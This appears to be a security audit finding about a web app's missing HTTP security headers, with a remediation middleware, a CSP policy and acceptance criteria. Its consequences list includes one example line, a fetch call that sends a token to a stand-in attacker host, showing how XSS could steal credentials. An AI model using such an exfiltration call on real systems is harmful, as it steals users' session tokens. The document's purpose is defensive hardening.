# [High] Missing security response headers (CSP, HSTS, X-Content-Type-Options, Referrer-Policy, Permissions-Policy)

**Severity:** 🟠 High
**CVSS v3.1 (estimated):** 6.5 — AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
**CWEs:** CWE-693 (Protection Mechanism Failure), CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)
**OWASP:** A05:2021 Security Misconfiguration, API8:2023 Security Misconfiguration, ASVS V14.4

## Summary

`backend/app/main.py` registers only `CORSMiddleware`. No middleware adds Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, or Permissions-Policy. The SPA is served with Starlette's `StaticFiles`, which likewise does not set defence headers.

Consequences:

- **No CSP.** Any XSS ([#02](./02-critical-stored-xss-html-export.md)) executes freely and can reach any origin (e.g. `fetch('https://attacker.tld/?t='+token)`).
- **No HSTS.** First-visit downgrade attacks on hostile networks are possible (the platform may redirect HTTP→HTTPS, but users can still reach `http://` once and be MITM'd).
- **No `X-Content-Type-Options: nosniff`.** CSV / printable export / JSON responses may be MIME-sniffed by older browsers, enabling content-type confusion attacks.
- **No `Referrer-Policy`.** Outbound clicks leak the full URL, which may include query parameters in exported URLs (dates).
- **No `Permissions-Policy`.** Default browser permissions (camera, microphone, geolocation) are implicitly allowed.
- **No `X-Frame-Options: DENY` / `frame-ancestors 'none'`.** App can be framed; clickjacking on destructive actions (delete assignment, revoke invite) is possible.

## Where

- `backend/app/main.py:140-148` — only CORSMiddleware.
- `backend/app/main.py:195-201` — Starlette mount for static files; no per-response headers.

## Recommended fix

Add a small middleware that sets a consistent baseline, then tighten per-route.

```python
# backend/app/middleware.py
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.types import ASGIApp


class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    def __init__(self, app: ASGIApp, *, csp: str, is_production: bool) -> None:
        super().__init__(app)
        self._csp = csp
        self._is_production = is_production

    async def dispatch(self, request, call_next):
        response = await call_next(request)
        headers = response.headers
        headers.setdefault("Content-Security-Policy", self._csp)
        headers.setdefault("X-Content-Type-Options", "nosniff")
        headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
        headers.setdefault("Permissions-Policy",
                           "accelerometer=(), camera=(), geolocation=(), gyroscope=(), "
                           "magnetometer=(), microphone=(), payment=(), usb=()")
        headers.setdefault("Cross-Origin-Opener-Policy", "same-origin")
        headers.setdefault("Cross-Origin-Resource-Policy", "same-origin")
        if self._is_production:
            headers.setdefault(
                "Strict-Transport-Security",
                "max-age=63072000; includeSubDomains; preload",
            )
        return response
```

Wire it in `main.py` before (outer-most) `CORSMiddleware`:

```python
CSP = (
    "default-src 'self'; "
    "script-src 'self'; "
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
    "font-src 'self' https://fonts.gstatic.com; "
    "img-src 'self' data:; "
    "connect-src 'self'; "
    "frame-ancestors 'none'; "
    "base-uri 'self'; "
    "form-action 'self'; "
    "object-src 'none'; "
    "require-trusted-types-for 'script';"
)
app.add_middleware(SecurityHeadersMiddleware, csp=CSP,
                   is_production=settings.environment == "production")
```

### Route-specific tightenings

- **Printable HTML export** (`/api/export/printable`): emit a stricter per-response CSP — `default-src 'none'; style-src 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src data:` — plus `Content-Disposition: attachment`.
- **CSV export** (`/api/export/csv`): emit `X-Content-Type-Options: nosniff` explicitly so the CSV is never interpreted as HTML by an old browser.
- **API JSON responses**: `X-Content-Type-Options: nosniff` is globally set by the middleware above.

### Self-host fonts

Move the Lato font files into the frontend bundle so you can tighten CSP to `font-src 'self'` and remove the `fonts.googleapis.com`/`fonts.gstatic.com` preconnects from `index.html`. Benefits: stricter CSP, no third-party beacon, offline-first, one fewer supply-chain leaf.

### Trusted Types migration (optional, high-value)

React 19 supports Trusted Types. Adding `require-trusted-types-for 'script'` (above) + `trusted-types default` turns *all* DOM-sink writes into policy-controlled ones — eliminates most future DOM XSS classes.

## Acceptance criteria

- [ ] `curl -I https://<deployment>/` shows `content-security-policy`, `strict-transport-security` (prod only), `x-content-type-options`, `referrer-policy`, `permissions-policy`, `cross-origin-opener-policy` headers.
- [ ] `curl -I https://<deployment>/api/health` shows the same headers.
- [ ] A test fetches the printable export and verifies a tighter CSP on that path.
- [ ] `securityheaders.com` graded **A** or better.
- [ ] Self-hosted Lato font removes all third-party connect-src entries.

## References

- OWASP Secure Headers Project: https://owasp.org/www-project-secure-headers/
- MDN CSP: https://developer.mozilla.org/docs/Web/HTTP/Headers/Content-Security-Policy
- Trusted Types intro: https://web.dev/trusted-types/
